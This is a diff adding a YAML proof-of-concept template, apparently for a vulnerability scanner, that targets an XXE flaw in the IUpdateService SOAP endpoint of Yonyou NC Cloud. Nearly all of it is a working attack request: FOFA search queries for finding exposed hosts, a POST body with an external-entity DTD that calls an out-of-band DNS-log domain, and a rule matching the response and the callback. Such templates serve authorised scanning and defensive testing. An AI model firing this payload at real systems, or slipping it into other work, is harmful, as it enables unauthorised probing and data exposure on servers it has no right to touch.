@@ -1,0 +1,51 @@
+id: poc-yaml-yongyou-nc-cloud-iupdateservice-xxe
+info:
+  name: 用友NC IUpdateService XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 用友-NC-Cloud
+  fofa: body="/Client/Uclient/UClient.exe"||body="ufida.ico"||body="nccloud"||body="/api/uclient/public/"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /uapws/service/nc.uap.oba.update.IUpdateService
+  headers:
+    Content-Type: text/xml;charset=UTF-8
+  data: '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+    xmlns:iup="http://update.oba.uap.nc/IUpdateService">
+
+    <soapenv:Header/>
+
+    <soapenv:Body>
+
+    <iup:getResult>
+
+    <!--type:string-->
+
+    <iup:string><![CDATA[
+
+    <!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "http://{{.domain}}">%aaa;%ccc;%ddd;]>
+
+    <xxx/>]]></iup:string>
+
+    </iup:getResult>
+
+    </soapenv:Body>
+
+    </soapenv:Envelope>
+
+    '
+  expression: 'status_code == 200 &&
+
+    contains(body,"design") &&
+
+    contains(body,"simpchn") &&
+
+    reverse.Sleep(2)
+
+    '
+transport: http
